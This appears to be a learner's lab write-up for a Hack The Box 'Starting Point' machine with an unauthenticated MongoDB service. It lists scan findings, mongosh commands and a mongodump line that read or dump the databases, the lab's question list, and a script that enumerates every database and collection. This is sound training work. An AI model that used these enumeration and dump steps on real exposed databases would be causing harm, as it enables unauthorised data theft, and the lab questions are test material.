[[VERY EASY]] [[Linux]] [[Starting Point]] [[NOSQL]] [[mongoDB]]
#completed 
# FIRST LOOK
Did an initial scan i got ssh and 27017 open. Get more details about these open ports, while detailed scan is working search what is mongod. Mongod = mongoDB. MongoDB is a NOSQL database. What does NOSQL mean? nosql means that it doesnt just rely on traditional tables, it can use documents, key-value pairs, graphs or columns. 

# EXPLOIT
Since I haven't tackled any problems yet regarding mongoDB, i first installed  mongosh. In my initial scan, i tried mongosh but the documentation of it is too clunky in my opinion. So i opened the HTB write up and i looked at the command for this to work.
```
show dbs;
use <dbs_name>;
show collections;
db.flag.find();
```
db.flag.find(); will output the contents of the flag collection in secret-information dbs. But for future improvement, better to dump out all of the files if it is small. use mongodump --host $IP --port 27017  --out /tmp/.

# QUESTIONS
- How many TCP ports are open on the machine?
- Which service is running on port 27017 of the remote host?
- What type of database is MongoDB? (Choose: SQL or NoSQL)
- What command is used to launch the interactive MongoDB shell from the terminal?
- What is the command used for listing all the databases present on the MongoDB server? (No need to include a trailing ;)
- What is the command used for listing out the collections in a database? (No need to include a trailing ;)
- What command is used to dump the content of all the documents within the collection named `flag`?

# FUTURE EXPLOITS
```
db.getMongo().getDBNames().forEach(function(d){
  print("DB: " + d);
  db.getSiblingDB(d).getCollectionNames().forEach(function(c){
    print("  Coll: " + c);
  });
});

db.getCollectionNames().forEach(function(c) {
  print("Collection: " + c);
  printjson(db[c].findOne());
});
```
